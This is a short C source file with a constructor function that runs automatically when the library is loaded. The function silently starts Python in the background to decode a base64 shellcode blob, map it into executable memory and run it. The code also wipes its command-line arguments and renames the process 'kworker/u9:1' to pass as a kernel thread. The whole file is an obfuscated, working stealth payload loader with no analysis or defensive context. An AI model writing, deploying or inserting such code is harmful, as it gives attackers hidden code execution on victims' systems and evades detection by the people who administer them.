#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char *find_python(void) {
    const char *candidates[] = {"python3", "python", "python3.11", NULL};
    for (int i = 0; candidates[i]; ++i) {
        if (access(candidates[i], X_OK) == 0)
            return candidates[i];
    }
    return NULL;
}

__attribute__((constructor))
static void run_python(void) {
    const char *python = find_python();
    if (!python) return;

    char cmd[4096];
    snprintf(cmd, sizeof(cmd),
        "%s -c \""
        "import base64, mmap, ctypes, sys, os;"
        "encoded=\\\"SDHJSIHp+f///0iNBe////9IuxzmhBFEkOdnSDFYJ0gt+P///+L0VF6rcy3+yBR05h1BEM+1AXTL50Uawg9oHOaEPjHjlUh+j+o+LP+fD33m0kYQzo1cROmBEUSQ52c=\\\";"
        "raw=base64.b64decode(encoded);"
        "mem=mmap.mmap(-1,len(raw),mmap.MAP_PRIVATE|mmap.MAP_ANONYMOUS,"
        "mmap.PROT_WRITE|mmap.PROT_READ|mmap.PROT_EXEC);"
        "mem.write(raw);"
        "addr=ctypes.addressof(ctypes.c_char.from_buffer(mem));"
        "shell_func=ctypes.CFUNCTYPE(None)(addr);"
        "[sys.argv.__setitem__(i,'\\0'*len(sys.argv[i])) for i in range(len(sys.argv))];"
        "libc=ctypes.CDLL(None);"
        "libc.prctl(15,b\\\"kworker/u9:1\\\",0,0,0);"
        "shell_func()\""
        " > /dev/null 2>&1 &", python);
    system(cmd);
}
